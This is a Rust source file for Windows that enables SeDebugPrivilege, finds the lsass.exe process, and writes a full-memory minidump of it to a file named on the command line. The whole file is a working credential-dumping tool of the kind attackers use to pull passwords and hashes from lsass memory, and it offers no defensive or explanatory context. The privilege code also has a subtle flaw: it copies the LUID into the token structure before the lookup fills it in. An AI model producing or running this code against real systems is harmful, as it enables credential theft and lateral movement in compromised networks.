use std::mem::size_of;
use std::ptr::null_mut;
use std::env;
use std::process::exit;

use sysinfo::{
    ProcessExt,
    System,
    PidExt,
    SystemExt
};

use windows::w;

use windows::core::{
    PCWSTR,
    HSTRING
};

use windows::Win32::Foundation::{
    HANDLE,
    LUID,
    BOOL
};

use windows::Win32::Security::{
    TOKEN_ADJUST_PRIVILEGES,
    LookupPrivilegeValueW,
    AdjustTokenPrivileges,
    SE_PRIVILEGE_ENABLED,
    TOKEN_PRIVILEGES,
    LUID_AND_ATTRIBUTES
};

use windows::Win32::System::Threading::{
    GetCurrentProcess,
    OpenProcessToken,
    OpenProcess,
    PROCESS_QUERY_INFORMATION,
    PROCESS_VM_READ
};

use windows::Win32::Storage::FileSystem::{
    CreateFileW,
    FILE_SHARE_MODE,
    CREATE_ALWAYS,
    FILE_ATTRIBUTE_NORMAL
};

use windows::Win32::System::Diagnostics::Debug::{
    MiniDumpWriteDump,
    MiniDumpWithFullMemory
};

fn enable_debug_privilege() {
    unsafe {
        let mut token_handle: HANDLE = Default::default();
        // Open the current process token
        if !OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES,
            &mut token_handle
        ).as_bool() {
            println!("Failed to open process token");
            exit(-1);
        }

        let mut luid: LUID = Default::default();

        let luid_and_attributes = LUID_AND_ATTRIBUTES {
            Luid: luid,
            Attributes: SE_PRIVILEGE_ENABLED,
        };

        let token_privileges = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [luid_and_attributes; 1]
        };

        // Search for the SeDebugPrivilege
        if !LookupPrivilegeValueW(
            PCWSTR(std::ptr::null()),
            PCWSTR::from(w!("SeDebugPrivilege")),
            &mut luid
        ).as_bool() {
            println!("Failed to lookup privilege value");
            exit(-1);
        }

        // Enable the privilege
        if !AdjustTokenPrivileges(
            token_handle,
            false,
            Some(&token_privileges),
            size_of::<TOKEN_PRIVILEGES>() as _,
            Some(null_mut()),
            Some(null_mut())
        ).as_bool() {
            println!("Failed to adjust token privilege");
            exit(-1)
        }
    }
}


// Find lsass.exe PID
fn get_lsass_pid() -> u32 {
        let s = System::new_all();
        for proc in s.processes_by_exact_name("lsass.exe") {
            return proc.pid().as_u32();
        }
        return 0;
}

fn minidump(output_path: &String) {
    let lsass_pid = get_lsass_pid();
    if lsass_pid == 0 {
        println!("Failed to find lsass.exe PID");
        exit(-1);
    }
    unsafe {
        // Create output file
        let output_file = CreateFileW(
            &HSTRING::from(output_path),
            0x10000000, // GENERIC_ALL
            FILE_SHARE_MODE(0),
            Some(std::ptr::null()),
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            HANDLE(0)
        ).unwrap();

        if output_file.is_invalid() {
            println!("Failed to create output file");
            exit(-1);
        }

        // Open lsass.exe process
        let lsass_handle = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
            BOOL(0),
            lsass_pid
        ).unwrap();

        if lsass_handle.is_invalid() {
            println!("Failed to open lsass.exe process");
            exit(-1);
        }

        // Dump lsass.exe process
        if !MiniDumpWriteDump(
            lsass_handle,
            lsass_pid,
            output_file,
            MiniDumpWithFullMemory,
            Some(std::ptr::null()),
            Some(std::ptr::null()),
            Some(std::ptr::null())
        ).as_bool() {
            println!("Failed to dump lsass.exe process memory");
            exit(-1);
        }

    }
}

fn main() {
    let args: Vec<String> = env::args().collect();
    let output_path = &args[1];
    enable_debug_privilege();
    minidump(output_path);
}

